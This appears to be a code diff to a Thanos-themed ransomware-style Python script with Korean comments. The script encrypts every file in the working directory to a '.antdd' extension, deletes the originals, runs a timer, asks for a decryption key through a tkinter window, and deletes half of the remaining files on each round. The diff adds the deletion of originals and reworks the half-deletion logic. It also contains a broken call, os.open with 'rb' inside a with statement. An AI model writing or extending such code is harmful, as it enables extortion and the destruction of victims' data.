@@ -6,7 +6,11 @@ import glob
 import os
 import threading
 from time import sleep
-
+'''
+암호화 / 복호화 기존에 1,2,3 
+while 루프 나오던 건 main_test
+gui랑 통합하고 있는 게 integrate_gui 
+'''
 #gui 라이브러리
 import tkinter
 from ui import thanos
@@ -15,6 +19,13 @@ from PIL import Image, ImageTk
 
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
+def key_submit():
+    pw = str(password.get())
+    label6 = tkinter.Label(window, text="키가 입력되었다 => "+pw, fg="red", bg="black", font="Helvetica 18 bold")
+    label6.pack()
+    pwbutton.destroy()
+    label4.destroy()
+    password.destroy()
 
 class tk:
     def __init__(self):
@@ -106,29 +117,28 @@ def remove_files(path,ext=None):
             elif name.endswith(ext):
                 remove_filelist.append(name)
     print("remove_filelist: \n", remove_filelist)
-
-    if(len(remove_filelist)>2):
+    # 파일이 2개 이상일 경우
+    if (len(remove_filelist) >= 2):
         n = 0
-        if((len(remove_filelist) / 2 ) % 2 == 0):
-            n=round(len(remove_filelist)/2) #정수로 변환
+        if (len(remove_filelist) % 2 == 0):
+            n = round(len(remove_filelist) / 2)  # 정수로 변환
             print("지울 파일 개수: ", n)
         else:
-            n=round(len(remove_filelist)/2)-1
+            n = round(len(remove_filelist) / 2) - 1
             print("지울 파일 개수: ", n)
 
         for i in range(n):
             print(remove_filelist[i])
             os.remove(remove_filelist[i])
         print("파일 중 절반이 삭제되었습니다.")
-    #파일이 1개 or 2개 남았을 경우
-    elif(len(remove_filelist)>0):
+
+    #파일이 1개 남았을 경우
+    elif(len(remove_filelist) == 1):
         os.remove(remove_filelist[0])
-    else:
-#        for i in range(2):
-#            os.remove(remove_filelist[i])
-#        print("파일 중 절반이 삭제되었습니다.")
         print("더 이상 삭제할 파일이 없습니다")
-        exit(0)
+    #맨 처음 파일이 0개일 경우
+    else:
+        print("더 이상 삭제할 파일이 없습니다")
 
     #label6.destroy()
     #label7 = tkinter.Label(window, image=image)
@@ -250,7 +260,7 @@ def dec( cipher, in_filename, out_filename):
     # write가 완료된 상태에서 out_file을 읽어보자
     # 읽을 때 rb가 아니라 r로 읽으면
     # UnicodeDecodeError: 'cp949' codec can't decode byte 0xed in position 7: illegal multibyte sequence
-    with open(out_filename, 'rb') as result:
+    with os.open(out_filename, 'rb') as result:
         print("4. decryption result is: ", out_filename)
         print(result.read())
 
@@ -272,12 +282,17 @@ if __name__ == "__main__":
 
     #timer 테스트
     enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
+    original_targetlist = enc_targetlist#원본파일 삭제시 사용
     # 나중에 전체 트래킹 하는 법 알아야함
     print("enc_targetlist: \n", enc_targetlist)
+    print("original_targetlist: \n", original_targetlist)
+    i = 0
     for enc_target in enc_targetlist:
         if enc_target.split('.')[-1] == 'antdd':
             continue
         enc(key, cipher, enc_target, out_filename=None)
+        os.remove(original_targetlist[i])#원본 파일을 삭제
+        i += 1
 
     # 타이머 시작 코드
     th1 = threading.Thread(target=startTimer)
